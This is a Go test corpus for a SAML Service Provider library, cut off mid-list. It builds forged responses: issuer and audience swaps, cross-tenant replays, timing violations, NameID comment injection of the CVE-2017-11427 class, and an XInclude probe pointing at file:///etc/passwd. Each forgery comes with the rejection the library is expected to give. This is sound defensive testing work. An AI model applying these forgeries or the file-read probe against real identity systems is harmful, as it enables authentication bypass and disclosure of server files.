// Copyright 2026 Hyperscale. All rights reserved.
// Use of this source code is governed by a MIT
// license that can be found in the LICENSE file.

package samlsp_test

// The corpus catalogue. Every entry declares, before generation, the
// outcome the Service Provider must produce: an exact identity, or the
// exact static error of the rule that must refuse it (plan review F1/F2).
// Forged values carry attacker markers (mallory@attacker.example, IDs
// starting with _evil) that no accepted identity may contain.

import (
	"crypto"
	"crypto/ecdsa"
	"encoding/asn1"
	"encoding/base64"
	"fmt"
	"math/big"
	"strings"
	"time"
	"unicode"

	"github.com/beevik/etree"
	samlsp "github.com/hyperscale-stack/security/saml/sp"
	dsig "github.com/russellhaering/goxmldsig"
	"github.com/stretchr/testify/require"
)

const (
	evilNameID      = "mallory@attacker.example"
	evilIssuer      = "https://idp.attacker.example"
	evilACS         = "https://sp.attacker.example/acs"
	nsDS            = "http://www.w3.org/2000/09/xmldsig#"
	nsXENC          = "http://www.w3.org/2001/04/xmlenc#"
	requesterCode   = "urn:oasis:names:tc:SAML:2.0:status:Requester"
	responderCode   = "urn:oasis:names:tc:SAML:2.0:status:Responder"
	authnFailed     = "urn:oasis:names:tc:SAML:2.0:status:AuthnFailed"
	noPassive       = "urn:oasis:names:tc:SAML:2.0:status:NoPassive"
	signatureShape  = "signature does not follow the SAML XML-DSig profile"
	notReferenced   = "the Reference does not point at the signed element"
	transformRule   = "transforms must be exactly enveloped-signature then exclusive C14N"
	oneAssertion    = "a response must carry exactly one assertion, child of the Response"
	misplacedSig    = "misplaced or repeated signature"
	verifyFailed    = "signature verification failed"
	twoLocalNames   = "two attributes of one local name"
	prefixedSAML    = "prefixed attribute named like a SAML or XML-DSig attribute"
	xmlAttribute    = "attribute in the xml namespace other than xml:lang, xml:space, xml:base or xml:id"
	duplicateID     = "duplicate identifier"
	notNSWellFormed = "name not namespace-well-formed"
)

// References used by several entries.
var (
	refXSW        = "Somorovsky et al., On Breaking SAML: Be Whoever You Want to Be (USENIX Security 2012)"
	refRaider     = "SAML Raider (CompassSecurity) XSWHelpers.applyXSW"
	refProfiles   = "SAML Profiles §4.1.4.2, §4.1.4.3"
	refDSig       = "SAML Core §5.4 (XML Signature profile)"
	refE91        = "SAML errata E91 (no ds:Object)"
	refIDs        = "SAML Core §1.3.4 (ID uniqueness)"
	refOWASP      = "OWASP SAML Security Cheat Sheet"
	refCR87       = "#87 code review F3 (attribute-name parser differential)"
	refPolicy     = "#87 user decision Q1 (algorithm policy)"
	refNamespaces = "Namespaces in XML 1.0 §3 (QName) and §7 (namespace-well-formedness)"
	refQ2         = "#87 user decision Q2 (ambiguous shapes refused)"
	// refXMLNamespace: the xml prefix is reserved and only xml:lang,
	// xml:space, xml:base and xml:id are defined (audit SAML-I1).
	refXMLNamespace = "Namespaces in XML 1.0 §3 (reserved xml prefix), XML 1.0 §2.10/§2.12, XML Base, xml:id"
)

// chainA composes assertion edits.
func chainA(fs ...func(a *etree.Element)) func(a *etree.Element) {
	return func(a *etree.Element) {
		for _, f := range fs {
			f(a)
		}
	}
}

// stripAttributes removes the attribute statement (compact fixtures).
func stripAttributes(a *etree.Element) {
	if st := child(a, "AttributeStatement"); st != nil {
		a.RemoveChild(st)
	}
}

// compact keeps a fixture small when only a refusal matters: no
// attribute statement and no KeyInfo.
func compact(o respOpts) respOpts {
	prev := o.beforeAssertion
	o.beforeAssertion = func(a *etree.Element) {
		stripAttributes(a)

		if prev != nil {
			prev(a)
		}
	}

	o.assertionSig.noKeyInfo = true
	o.responseSig.noKeyInfo = true

	return o
}

// evil rewrites an assertion clone into a forged one.
func evil(a *etree.Element, id string) *etree.Element {
	if s := child(a, "Signature"); s != nil {
		a.RemoveChild(s)
	}

	if id != "" {
		a.CreateAttr("ID", id)
	}

	path(a, "Subject", "NameID").SetText(evilNameID)

	return a
}

// unsignedCopy returns a copy of el without its Signature.
func unsignedCopy(el *etree.Element) *etree.Element {
	c := el.Copy()
	if s := child(c, "Signature"); s != nil {
		c.RemoveChild(s)
	}

	return c
}

// setNameID returns an edit setting the NameID text.
func setNameID(value string) func(a *etree.Element) {
	return func(a *etree.Element) { path(a, "Subject", "NameID").SetText(value) }
}

// statusResponseXML builds an unsigned error response answering tx.
func (g *corpusGen) statusResponseXML(tx string, edit func(r *etree.Element)) []byte {
	g.t.Helper()

	r := buildResponse(respParams{requestID: g.txs[tx].RequestID, issued: t0})
	if edit != nil {
		edit(r)
	}

	doc := etree.NewDocument()
	doc.SetRoot(r)

	out, err := doc.WriteToString()
	require.NoError(g.t, err)

	return []byte(out)
}

// setStatus replaces the status of a response.
func setStatus(code, subCode, message string) func(r *etree.Element) {
	return func(r *etree.Element) {
		r.RemoveChild(child(r, "Status"))
		st := etree.NewElement("samlp:Status")
		sc := st.CreateElement("samlp:StatusCode")
		sc.CreateAttr("Value", code)

		if subCode != "" {
			sc.CreateElement("samlp:StatusCode").CreateAttr("Value", subCode)
		}

		if message != "" {
			st.CreateElement("samlp:StatusMessage").SetText(message)
		}

		r.InsertChildAt(child(r, "Issuer").Index()+1, st)
	}
}

// dupAttr returns an edit giving el a prefixed same-local-name twin of
// name, before (prefixedFirst) or after the unprefixed one.
func dupAttr(name, value string, prefixedFirst bool) func(el *etree.Element) {
	return func(el *etree.Element) {
		orig := el.SelectAttrValue(name, "")
		el.RemoveAttr(name)
		el.CreateAttr("xmlns:evil", "urn:evil:attacker.example")

		if prefixedFirst {
			el.CreateAttr("evil:"+name, value)
			el.CreateAttr(name, orig)

			return
		}

		el.CreateAttr(name, orig)
		el.CreateAttr("evil:"+name, value)
	}
}

// kebab renders a CamelCase attribute name in lower case, words separated
// by hyphens: SPNameQualifier is sp-name-qualifier.
func kebab(name string) string {
	var b strings.Builder

	for i, r := range name {
		upper := unicode.IsUpper(r)
		prevLower := i > 0 && unicode.IsLower(rune(name[i-1]))
		nextLower := i+1 < len(name) && unicode.IsLower(rune(name[i+1]))

		if i > 0 && upper && (prevLower || (nextLower && unicode.IsUpper(rune(name[i-1])))) {
			b.WriteByte('-')
		}

		b.WriteRune(unicode.ToLower(r))
	}

	return b.String()
}

// rawRS converts an ASN.1 DER ECDSA signature value to XML Signature 1.1
// raw r‖s (P-256: 32 bytes each).
func rawRS(der []byte) []byte {
	var sig struct{ R, S *big.Int }
	if _, err := asn1.Unmarshal(der, &sig); err != nil {
		panic(err)
	}

	out := make([]byte, 64)
	sig.R.FillBytes(out[:32])
	sig.S.FillBytes(out[32:])

	return out
}

// corpusSpecs returns the catalogue, in a fixed order (the randomness is a
// stream: ECDSA signatures draw from it).
func corpusSpecs(g *corpusGen) []corpusSpec {
	var specs []corpusSpec

	for _, part := range [][]corpusSpec{
		g.baselineSpecs(), g.correlationSpecs(), g.timeSpecs(), g.statusSpecs(), g.shapeSpecs(),
		g.keySpecs(), g.xswSpecs(), g.idSpecs(), g.substitutionSpecs(), g.algorithmSpecs(),
		g.signatureSpecs(), g.differentialSpecs(), g.xmlSpecs(), g.encryptionSpecs(), g.limitSpecs(),
		g.replaySpecs(),
	} {
		specs = append(specs, part...)
	}

	return specs
}

func (g *corpusGen) baselineSpecs() []corpusSpec {
	base := baselineIdentity()

	withProxy := baselineIdentity()
	zero := 0
	withProxy.ProxyRestriction = &samlsp.ProxyRestriction{Count: &zero, Audiences: []string{"https://downstream.example.com"}}

	withoutCount := baselineIdentity()
	withoutCount.ProxyRestriction = &samlsp.ProxyRestriction{Audiences: []string{"https://downstream.example.com"}}

	inert := baselineIdentity()
	inert.Attributes = append(inert.Attributes, samlsp.Attribute{Name: "xinclude-probe", Values: []string{""}})

	return []corpusSpec{
		{
			id: "baseline/assertion-signed", attack: "reference response: assertion signed (rsa-sha256, exc-c14n, KeyInfo)",
			build: func() []byte { return g.xml("acme", respOpts{}) }, expect: accepted(base),
		},
		{
			id: "baseline/response-signed", attack: "only the Response is signed (errata E26/E93)",
			build:  func() []byte { return g.xml("acme", respOpts{unsignedAssert: true, signResponse: true}) },
			expect: accepted(base),
		},
		{
			id: "baseline/both-signed", attack: "Response and Assertion signed",
			build: func() []byte { return g.xml("acme", respOpts{signResponse: true}) }, expect: accepted(base),
		},
		{
			id: "baseline/ecdsa-p256", attack: "ECDSA P-256 IdP key (ASN.1 DER signature value, as goxmldsig signs)",
			knobs: corpusKnobs{Trust: []string{"idp-ec"}},
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{signer: g.keys["idp-ec"]}})
			},
			expect: accepted(base),
		},
		{
			id: "baseline/exc-c14n-with-comments", attack: "exclusive C14N with comments",
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{canon: exclusiveWithComments()}})
			},
			expect: accepted(base),
		},
		{
			id: "baseline/opensaml-prefixlist", attack: "OpenSAML-style InclusiveNamespaces PrefixList on the exc-c14n transform",
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{inclusivePrefixes: "xs"}})
			},
			expect: accepted(base),
		},
		{
			id: "baseline/xml-namespace-attributes", attack: "xml:lang, xml:space, xml:base and xml:id on a signed Attribute (the names the XML namespace defines)",
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) {
					attr := path(a, "AttributeStatement", "Attribute")
					attr.CreateAttr("xml:lang", "en")
					attr.CreateAttr("xml:space", "preserve")
					attr.CreateAttr("xml:base", "https://idp.example.com/")
					attr.CreateAttr("xml:id", "_attribute-mail")
				}))
			},
			expect: accepted(base),
		},
		{
			id: "baseline/rollover-no-keyinfo", attack: "two trusted keys, signed by the new one without KeyInfo (rollover retry)",
			knobs: corpusKnobs{Trust: []string{"idp-a", "idp-b"}},
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{signer: g.keys["idp-b"], noKeyInfo: true}})
			},
			expect: accepted(base),
		},
		{
			id: "baseline/sha1-with-opt-in", attack: "rsa-sha1 accepted only with the connection's InsecureAllowSHA1",
			knobs: corpusKnobs{AllowSHA1: true},
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{method: dsig.RSASHA1SignatureMethod}})
			},
			expect: accepted(base),
		},
		{
			id: "baseline/comment-in-nameid", attack: "comment injected in the NameID after signing (CVE-2017-11427 class): the full canonical value is used",
			build: func() []byte {
				return g.xml("acme", respOpts{raw: func(s string) string {
					return strings.Replace(s, ">"+nameIDValue+"<", ">alice-pair<!-- _evil -->wise-0001<", 1)
				}})
			},
			expect: accepted(base),
		},
		{
			id: "baseline/cdata-nameid", attack: "NameID wrapped in CDATA after signing (canonically identical)",
			build: func() []byte {
				return g.xml("acme", respOpts{raw: func(s string) string {
					return strings.Replace(s, ">"+nameIDValue+"<", "><![CDATA["+nameIDValue+"]]><", 1)
				}})
			},
			expect: accepted(base),
		},
		{
			id: "baseline/character-reference-audience", attack: "character reference in the Audience after signing (canonically identical)",
			build: func() []byte {
				return g.xml("acme", respOpts{raw: func(s string) string {
					return strings.Replace(s, ">"+spEntityID+"<", ">&#x68;ttps://sp.example.com/saml/acme<", 1)
				}})
			},
			expect: accepted(base),
		},
		{
			id: "baseline/nameid-surrounding-white-space", attack: "signed NameID with surrounding white space: preserved exactly, never trimmed",
			build: func() []byte {
				return g.xml("acme", onAssertion(setNameID("  "+nameIDValue+" ")))
			},
			expect: accepted(spacedNameID()),
		},
		{
			id: "baseline/character-reference-nameid", attack: "character reference in the NameID after signing (canonically identical)",
			build: func() []byte {
				return g.xml("acme", respOpts{raw: func(s string) string {
					return strings.Replace(s, ">"+nameIDValue+"<", ">&#x61;lice-pairwise-0001<", 1)
				}})
			},
			expect: accepted(base),
		},
		{
			id: "baseline/utf8-byte-order-mark", attack: "UTF-8 byte order mark before the document (tolerated)",
			build:  func() []byte { return append([]byte("\xEF\xBB\xBF"), g.xml("acme", respOpts{})...) },
			expect: accepted(base),
		},
		{
			id: "baseline/unsigned-response-without-destination", attack: "unsigned Response without Destination (Bindings §3.5.5.2 only requires it when signed)",
			build: func() []byte {
				return g.xml("acme", onResponse(func(r *etree.Element) { r.RemoveAttr("Destination") }))
			},
			expect: accepted(base),
		},
		{
			id: "baseline/without-response-inresponseto", attack: "Response InResponseTo absent (optional); the signed bearer confirmation correlates",
			build: func() []byte {
				return g.xml("acme", onResponse(func(r *etree.Element) { r.RemoveAttr("InResponseTo") }))
			},
			expect: accepted(base),
		},
		{
			id: "baseline/proxy-restriction-count-zero", attack: "OneTimeUse and ProxyRestriction Count=0 are surfaced (Core §2.5.1.5/§2.5.1.6)",
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) {
					c := child(a, "Conditions")
					c.CreateElement("saml:OneTimeUse")
					pr := c.CreateElement("saml:ProxyRestriction")
					pr.CreateAttr("Count", "0")
					pr.CreateElement("saml:Audience").SetText("https://downstream.example.com")
				}))
			},
			expect: accepted(withProxy),
		},
		{
			id: "baseline/proxy-restriction-without-count", attack: "ProxyRestriction without Count: no indirection limit (Count stays absent, not 0)",
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) {
					child(a, "Conditions").CreateElement("saml:ProxyRestriction").
						CreateElement("saml:Audience").SetText("https://downstream.example.com")
				}))
			},
			expect: accepted(withoutCount),
		},
		{
			id: "baseline/xinclude-inert", attack: "XInclude element in a signed AttributeValue: never processed, the value stays empty",
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) {
					attr := path(a, "AttributeStatement").CreateElement("saml:Attribute")
					attr.CreateAttr("Name", "xinclude-probe")
					inc := attr.CreateElement("saml:AttributeValue").CreateElement("xi:include")
					inc.CreateAttr("xmlns:xi", "http://www.w3.org/2001/XInclude")
					inc.CreateAttr("href", "file:///etc/passwd")
				}))
			},
			expect: accepted(inert),
		},
	}
}

// spacedNameID is the baseline identity with a NameID kept with its
// surrounding white space.
func spacedNameID() samlsp.Identity {
	id := baselineIdentity()
	id.NameID.Value = "  " + nameIDValue + " "

	return id
}

func (g *corpusGen) correlationSpecs() []corpusSpec {
	initech := g.conns["initech"]

	return []corpusSpec{
		{
			id: "correlation/response-issuer-other-idp", attack: "Response Issuer of another IdP", refs: []string{refProfiles},
			build: func() []byte {
				return g.xml("acme", onResponse(func(r *etree.Element) { child(r, "Issuer").SetText(evilIssuer) }))
			},
			expect: rejected("ErrIssuerMismatch", ""),
		},
		{
			id: "correlation/assertion-issuer-other-idp", attack: "signed Assertion Issuer of another IdP", refs: []string{refProfiles},
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) { child(a, "Issuer").SetText(evilIssuer) }))
			},
			expect: rejected("ErrIssuerMismatch", ""),
		},
		{
			id: "correlation/response-issuer-missing", attack: "Response without Issuer (strict profile)", refs: []string{refProfiles, refQ2},
			build: func() []byte {
				return g.xml("acme", onResponse(func(r *etree.Element) { r.RemoveChild(child(r, "Issuer")) }))
			},
			expect: rejected("ErrIssuerMismatch", "Response needs exactly one Issuer"),
		},
		{
			id: "correlation/assertion-issuer-missing", attack: "signed assertion without Issuer", refs: []string{refProfiles},
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) { a.RemoveChild(child(a, "Issuer")) }))
			},
			expect: rejected("ErrIssuerMismatch", "Assertion needs exactly one Issuer"),
		},
		{
			id: "correlation/two-response-issuers", attack: "two Issuers on the Response (the decoder keeps one)", refs: []string{refProfiles, refQ2},
			build: func() []byte {
				return g.xml("acme", onResponse(func(r *etree.Element) {
					extra := child(r, "Issuer").Copy()
					extra.SetText(evilIssuer)
					r.InsertChildAt(0, extra)
				}))
			},
			expect: rejected("ErrIssuerMismatch", "Response needs exactly one Issuer"),
		},
		{
			id: "correlation/two-assertion-issuers", attack: "two Issuers in the signed assertion", refs: []string{refProfiles, refQ2},
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) {
					extra := child(a, "Issuer").Copy()
					extra.SetText(evilIssuer)
					a.InsertChildAt(child(a, "Issuer").Index()+1, extra)
				}))
			},
			expect: rejected("ErrIssuerMismatch", "Assertion needs exactly one Issuer"),
		},
		{
			id: "correlation/response-issuer-format", attack: "Response Issuer with a non-entity Format", refs: []string{refProfiles, "SAML Core §2.2.5"},
			build: func() []byte {
				return g.xml("acme", onResponse(func(r *etree.Element) {
					child(r, "Issuer").CreateAttr("Format", samlsp.NameIDFormatPersistent)
				}))
			},
			expect: rejected("ErrIssuerMismatch", "Response Issuer Format is not entity"),
		},
		{
			id: "correlation/assertion-issuer-format", attack: "signed Assertion Issuer with a non-entity Format", refs: []string{refProfiles},
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) {
					child(a, "Issuer").CreateAttr("Format", samlsp.NameIDFormatEmailAddress)
				}))
			},
			expect: rejected("ErrIssuerMismatch", "Assertion Issuer Format is not entity"),
		},
		{
			id: "correlation/audience-other-sp", attack: "signed assertion for another SP", refs: []string{refProfiles, "SAML Core §2.5.1.4"},
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) {
					path(a, "Conditions", "AudienceRestriction", "Audience").SetText("https://sp.attacker.example")
				}))
			},
			expect: rejected("ErrAudienceMismatch", "an AudienceRestriction does not name the SP entity ID"),
		},
		{
			id: "correlation/audience-restriction-missing", attack: "signed assertion without AudienceRestriction", refs: []string{refProfiles},
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) {
					c := child(a, "Conditions")
					c.RemoveChild(child(c, "AudienceRestriction"))
				}))
			},
			expect: rejected("ErrAudienceMismatch", "no AudienceRestriction"),
		},
		{
			id: "correlation/audience-and-of-ors", attack: "second AudienceRestriction without the SP (AND of ORs)", refs: []string{"SAML Core §2.5.1.4", "SAML errata E46"},
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) {
					child(a, "Conditions").CreateElement("saml:AudienceRestriction").
						CreateElement("saml:Audience").SetText("https://sp.attacker.example")
				}))
			},
			expect: rejected("ErrAudienceMismatch", "an AudienceRestriction does not name the SP entity ID"),
		},
		{
			id: "correlation/destination-other-signed", attack: "signed Response for another ACS", refs: []string{"SAML Bindings §3.5.5.2"},
			build: func() []byte {
				return g.xml("acme", respOpts{signResponse: true, before: func(r, _ *etree.Element) { r.CreateAttr("Destination", evilACS) }})
			},
			expect: rejected("ErrDestinationMismatch", ""),
		},
		{
			id: "correlation/destination-missing-signed", attack: "signed Response without Destination", refs: []string{"SAML Bindings §3.5.5.2"},
			build: func() []byte {
				return g.xml("acme", respOpts{signResponse: true, before: func(r, _ *etree.Element) { r.RemoveAttr("Destination") }})
			},
			expect: rejected("ErrDestinationMismatch", "signed Response without Destination"),
		},
		{
			id: "correlation/destination-other-unsigned", attack: "unsigned Response naming another ACS (used only to refuse)", refs: []string{"SAML Bindings §3.5.5.2"},
			build: func() []byte {
				return g.xml("acme", onResponse(func(r *etree.Element) { r.CreateAttr("Destination", evilACS) }))
			},
			expect: rejected("ErrDestinationMismatch", ""),
		},
		{
			id: "correlation/recipient-other", attack: "bearer confirmation for another ACS", refs: []string{refProfiles},
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) { scd(a).CreateAttr("Recipient", evilACS) }))
			},
			expect: rejected("ErrRecipientMismatch", ""),
		},
		{
			id: "correlation/recipient-missing", attack: "bearer confirmation without Recipient", refs: []string{refProfiles},
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) { scd(a).RemoveAttr("Recipient") }))
			},
			expect: rejected("ErrRecipientMismatch", ""),
		},
		{
			id: "correlation/inresponseto-other-transaction", attack: "response answering another transaction of the same browser (RelayState recombination)",
			refs:   []string{"SAML Bindings §3.5.5.2", "SAML errata E90"},
			build:  func() []byte { return g.xml("acme-2", respOpts{}) },
			expect: rejected("ErrInResponseToMismatch", "Response InResponseTo is not the request ID"),
		},
		{
			id: "correlation/scd-inresponseto-other-transaction", attack: "signed bearer confirmation answering another transaction, Response InResponseTo removed",
			refs: []string{refProfiles, "SAML Bindings §3.5.5.2"},
			build: func() []byte {
				return g.xml("acme-2", onResponse(func(r *etree.Element) { r.RemoveAttr("InResponseTo") }))
			},
			expect: rejected("ErrInResponseToMismatch", "InResponseTo is not the request ID"),
		},
		{
			id: "correlation/rewrapped-assertion", attack: "assertion signed for another transaction rewrapped in a new Response (new ID, no InResponseTo)",
			refs: []string{"SAML Profiles §4.1.4.5"},
			build: func() []byte {
				return g.xml("acme-2", onResponse(func(r *etree.Element) {
					r.RemoveAttr("InResponseTo")
					r.CreateAttr("ID", "_evil-rewrapped-response")
				}))
			},
			expect: rejected("ErrInResponseToMismatch", "InResponseTo is not the request ID"),
		},
		{
			id: "correlation/scd-inresponseto-missing", attack: "signed bearer confirmation without InResponseTo (unsolicited)",
			refs: []string{"SAML Profiles §4.1.5", "SAML errata E90"},
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) { scd(a).RemoveAttr("InResponseTo") }))
			},
			expect: rejected("ErrUnsolicitedResponse", "no InResponseTo in the bearer confirmation"),
		},
		{
			id: "correlation/response-inresponseto-other", attack: "unsigned Response InResponseTo of another request", refs: []string{refProfiles},
			build: func() []byte {
				return g.xml("acme", onResponse(func(r *etree.Element) { r.CreateAttr("InResponseTo", "_evil-request") }))
			},
			expect: rejected("ErrInResponseToMismatch", "Response InResponseTo is not the request ID"),
		},
		{
			id: "correlation/posted-to-other-connection", attack: "acme's response and RelayState posted to globex's ACS",
			refs: []string{"#87 decision D1 (per-connection SP)"}, knobs: corpusKnobs{PostTo: "globex"},
			build: func() []byte { return g.xml("acme", respOpts{}) }, file: "baseline/assertion-signed.xml",
			expect: rejected("ErrTransactionNotFound", ""),
		},
		{
			id: "correlation/received-outside-acs", attack: "response received at another path than the connection's ACS",
			refs: []string{"SAML Bindings §3.5.5.2"}, knobs: corpusKnobs{Path: "other"},
			build: func() []byte { return g.xml("acme", respOpts{}) }, file: "baseline/assertion-signed.xml",
			expect: rejected("ErrDestinationMismatch", "request received outside the connection's ACS path"),
		},
		{
			id: "correlation/globex-response-at-acme", attack: "globex's response (its IdP key) delivered to acme",
			refs: []string{"#87 acceptance criterion 3"},
			build: func() []byte {
				return g.xml("acme", respOpts{assertionSig: sigOpts{signer: g.keys["idp-b"]}})
			},
			expect: rejected("ErrInvalidSignature", verifyFailed),
		},
		{
			id: "correlation/cross-tenant-destination", tx: "initech",
			attack: "tenant squatting (D1): acme's IdP signs a Response for acme's SP answering initech's request; signed Destination refuses it",
			refs:   []string{"#88 plan review F4", "SAML Bindings §3.5.5.2"},
			build: func() []byte {
				return g.xml("initech", respOpts{signResponse: true, unsignedAssert: true})
			},
			expect: rejected("ErrDestinationMismatch", ""),
		},
		{
			id: "correlation/cross-tenant-recipient", tx: "initech",
			attack: "tenant squatting (D1): assertion-only signature, no Destination; the signed Recipient refuses it",
			refs:   []string{"#88 plan review F4", refProfiles},
			build: func() []byte {
				return g.xml("initech", onResponse(func(r *etree.Element) { r.RemoveAttr("Destination") }))
			},
			expect: rejected("ErrRecipientMismatch", ""),
		},
		{
			id: "correlation/cross-tenant-audience", tx: "initech",
			attack: "tenant squatting (D1): Destination and Recipient of initech, audience of acme; the audience refuses it",
			refs:   []string{"#88 plan review F4", "SAML Core §2.5.1.4"},
			build: func() []byte {
				return g.xml("initech", respOpts{
					beforeAssertion: func(a *etree.Element) { scd(a).CreateAttr("Recipient", initech.ACSURL) },
					before:          func(r, _ *etree.Element) { r.CreateAttr("Destination", initech.ACSURL) },
				})
			},
			expect: rejected("ErrAudienceMismatch", "an AudienceRestriction does not name the SP entity ID"),
		},
	}
}

func (g *corpusGen) timeSpecs() []corpusSpec {
	wide := func(a *etree.Element) {
		scd(a).CreateAttr("NotOnOrAfter", ts(9*time.Minute))
		child(a, "Conditions").CreateAttr("NotOnOrAfter", ts(9*time.Minute))
	}

	refTime := []string{"SAML Core §2.5.1.2", "SAML errata E92 (clock skew)"}

	return []corpusSpec{
		{
			id: "time/subject-confirmation-expired", attack: "bearer confirmation well past NotOnOrAfter + skew",
			refs: []string{refProfiles}, knobs: corpusKnobs{At: "9m"},
			build: func() []byte { return g.xml("acme", respOpts{}) }, file: "baseline/assertion-signed.xml",
			expect: rejected("ErrAssertionExpired", ""),
		},
		{
			id: "time/subject-confirmation-expiry-boundary", attack: "clock exactly at NotOnOrAfter + skew (exclusive bound)",
			refs: []string{refProfiles, "SAML errata E92"}, knobs: corpusKnobs{At: "8m"},
			build: func() []byte { return g.xml("acme", respOpts{}) }, file: "baseline/assertion-signed.xml",
			expect: rejected("ErrAssertionExpired", "subject confirmation expired"),
		},
		{
			id: "time/conditions-expired", attack: "Conditions NotOnOrAfter + skew passed, confirmation still valid",
			refs: refTime, knobs: corpusKnobs{At: "8m"},
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) {
					wide(a)
					child(a, "Conditions").CreateAttr("NotOnOrAfter", ts(5*time.Minute))
				}))
			},
			expect: rejected("ErrAssertionExpired", "assertion expired"),
		},
		{
			id: "time/session-ended", attack: "SessionNotOnOrAfter + skew passed",
			refs: []string{"SAML Core §2.7.2", "SAML Profiles §4.1.4.3"}, knobs: corpusKnobs{At: "4m"},
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) {
					wide(a)
					child(a, "AuthnStatement").CreateAttr("SessionNotOnOrAfter", ts(time.Minute))
				}))
			},
			expect: rejected("ErrAssertionExpired", "session already ended"),
		},
		{
			id: "time/not-yet-valid", attack: "Conditions NotBefore beyond now + skew", refs: refTime,
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) {
					wide(a)
					child(a, "Conditions").CreateAttr("NotBefore", ts(5*time.Minute))
				}))
			},
			expect: rejected("ErrAssertionNotYetValid", "assertion not yet valid"),
		},
		{
			id: "time/issued-in-the-future", attack: "IssueInstant beyond now + skew", refs: []string{"#87 plan §6.4 (IssueInstant bounds)"},
			build:  func() []byte { return g.xml("acme", respOpts{issued: t0.Add(10 * time.Minute)}) },
			expect: rejected("ErrAssertionNotYetValid", "IssueInstant in the future"),
		},
		{
			id: "time/authn-instant-in-the-future", attack: "AuthnInstant beyond now + skew", refs: []string{"SAML Core §2.7.2"},
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) {
					child(a, "AuthnStatement").CreateAttr("AuthnInstant", ts(10*time.Minute))
				}))
			},
			expect: rejected("ErrAssertionNotYetValid", "AuthnInstant in the future"),
		},
		{
			id: "time/issued-before-the-request", attack: "assertion issued a day before the AuthnRequest it claims to answer",
			refs: []string{"#87 plan §6.4"},
			build: func() []byte {
				return g.xml("acme", respOpts{issued: t0.Add(-24 * time.Hour), beforeAssertion: func(a *etree.Element) {
					scd(a).CreateAttr("NotOnOrAfter", ts(5*time.Minute))
					child(a, "Conditions").CreateAttr("NotOnOrAfter", ts(5*time.Minute))
				}})
			},
			expect: rejected("ErrInvalidAssertion", "issued before the AuthnRequest it answers"),
		},
		{
			id: "time/not-before-not-before-not-on-or-after", attack: "Conditions NotBefore equal to NotOnOrAfter", refs: refTime,
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) {
					child(a, "Conditions").CreateAttr("NotBefore", ts(5*time.Minute))
				}))
			},
			expect: rejected("ErrInvalidAssertion", "NotBefore is not before NotOnOrAfter"),
		},
		{
			id: "time/offset-time-zone", attack: "time value with a zone offset instead of UTC Z", refs: []string{"SAML Core §1.3.3"},
			build: func() []byte {
				return g.xml("acme", onAssertion(func(a *etree.Element) { a.CreateAttr("IssueInstant", "2026-10-12T12:00:00+02:00") }))
			},
			expect: rejected("ErrMalformedResponse", "time value not in UTC xs:dateTime form"),
		},
		{
			id: "time/authn-instant-with-offset", attack: "signed AuthnInstant with a zone offset (#87 code review R12)",
			refs: []string{"SAML Core §1.3.3"},
			build: func() []byte {
				return g.xml("acme", compact(onAssertion(func(a *etree.Element) {
					child(a, "AuthnStatement").CreateAttr("AuthnInstant", "2026-10-12T12:00:00+02:00")
				})))
			},
			expect: rejected("ErrMalformedResponse", "time value not in UTC xs:dateTime form"),
		},
		{
			id: "time/session-not-on-or-after-with-offset", attack: "signed SessionNotOnOrAfter with a zone offset (#87 code review R12)",
			refs: []string{"SAML Core §1.3.3"},
			build: func() []byte {
				return g.xml("acme", compact(onAssertion(func(a *etree.Element) {
					child(a, "AuthnStatement").CreateAttr("SessionNotOnOrAfter", "2026-10-12T20:00:00+02:00")
				})))
			},
			expect: rejected("ErrMalformedResponse", "time value not in UTC xs:dateTime form"),
		},
		{
			id: "time/stale-authentication-with-forceauthn", tx: "acme-forceauthn",
			attack: "ForceAuthn requested, AuthnInstant an hour before the request", refs: []string{"SAML Core §3.4.1"},
			build: func() []byte {
				return g.xml("acme-forceauthn", onAssertion(func(a *etree.Element) {
					child(a, "AuthnStatement").CreateAttr("AuthnInstant", ts(-time.Hour))
				}))
			},
			expect: rejected("ErrStaleAuthentication", ""),
		},
		{
			id: "time/transaction-expired", attack: "valid response arriving when the transaction expired",
			refs: []string{"#87 plan §5.2 step 8"}, knobs: corpusKnobs{At: "10m"},
			build:  func() []byte { return g.xml("acme", respOpts{issued: t0.Add(9 * time.Minute)}) },
			expect: rejected("ErrTransactionExpired", ""),
		},
	}
}

func (g *corpusGen) statusSpecs() []corpusSpec {
	refStatus := []string{"SAML Core §3.2.2.2", "SAML errata E65"}

	return []corpusSpec{
		{
			id: "status/requester-authn-failed", attack: "IdP error status with a second-level code and a message naming the attacker",
			refs: refStatus,
			build: func() []byte {
				return g.statusResponseXML("acme", setStatus(requesterCode, authnFailed, "Authentication failed for "+evilNameID))
			},
			expect: statusOf(requesterCode, authnFailed, "Authentication failed for "+evilNameID, "Requester, AuthnFailed"),
		},
		{
			id: "status/responder-no-passive", attack: "NoPassive answer to IsPassive", refs: refStatus,
			build:  func() []byte { return g.statusResponseXML("acme", setStatus(responderCode, noPassive, "")) },
